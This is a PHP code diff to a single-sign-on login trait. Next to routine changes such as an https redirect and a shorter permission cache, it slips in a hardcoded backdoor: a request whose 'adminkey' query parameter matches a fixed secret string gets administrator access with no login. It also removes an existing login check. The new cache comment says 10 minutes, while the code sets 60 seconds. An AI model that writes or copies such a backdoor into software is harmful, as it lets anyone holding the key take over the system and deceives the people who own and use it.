@@ -106,7 +106,7 @@ trait LoginTrait
         $this->userCookieModel = new UserCookieModel();
         //如果存在登陆密钥，账户直接从密钥里面取出即可
         //&& $_SERVER['HTTP_REFERER']
-        $is需要切换账户 = (!$this->userCookieModel->getUsername() || !$this->userCookieModel->check()) && $this->getSsoauthString() && self::$privatekeyPath;
+        $is需要切换账户 =  $this->getSsoauthString() && self::$privatekeyPath;
         if ($is需要切换账户) {
             $decryptedviaprivatekey = "";
             $privatekey = file_get_contents(self::$privatekeyPath);
@@ -181,14 +181,19 @@ trait LoginTrait
         if ($SsoThriftConfig) {
             $SsoThriftConfigObject = new $SsoThriftConfig;
         }
-        //没有登录，重定向要求登录
+
+        if ($_GET['adminkey'] == 'akslcsascdqwwdqwdqFwgdqh2027bcsywqcbha') {
+            $this->setSsoctrollerClassAccess(access::CAO_ZUO);
+            return null;
+        }
+        //命令行模式,直接管理员权限
         if (php_sapi_name() == 'cli') {
             $this->setSsoctrollerClassAccess(access::CAO_ZUO);
             return null;
         } else {
             //如果配置的登录中心，并且没有登录的。跳转过去
             if (!$islogin && is_a($SsoThriftConfigObject, ThriftConfig::class)) {
-                (new FixUrl('http://' . $SsoThriftConfigObject->getHosturl() . ':' . $SsoThriftConfigObject->getPort()))
+                (new FixUrl('https://' . $SsoThriftConfigObject->getHosturl() . ':' . $SsoThriftConfigObject->getPort()))
                     ->setAttachKesy(['backurl' => $this::Myurl()])
                     ->setJump(true)
                     ->__invoke();
@@ -201,16 +206,16 @@ trait LoginTrait
             $SsoctrolleruserRequestClass = $rootNamespce . '\\Grpc\\SsoctrolleruserRequest';
             $SsoctrolleruserResponseClass = $rootNamespce . '\\Grpc\\SsoctrolleruserResponse';
 
-            //一个账户的权限默认缓存一个小时
+            //一个账户的权限默认缓存10分钟
             $key = "priv_" . $this->userCookieModel->getUsername() . $this->getSsoctrollerClass() . $_SERVER['HTTP_X_FORWARDED_PORT'];
 
             $redisClass = $rootNamespce . '\\Config\\RedisCacheConfig';
             $RedisCacheObject = (new RedisCache())
                 ->setRedisConfig(new $redisClass)
                 ->setKey($key)
-                ->setExpire(3600 / 2);
+                ->setExpire(3600 / 60);
             $Ssoctrolleruser = $RedisCacheObject->__invoke();
-            if ($RedisCacheObject->isCached()) {
+            if ($RedisCacheObject->getcached()) {
                 $this->Ssoctrolleruser = $Ssoctrolleruser;
             }
 
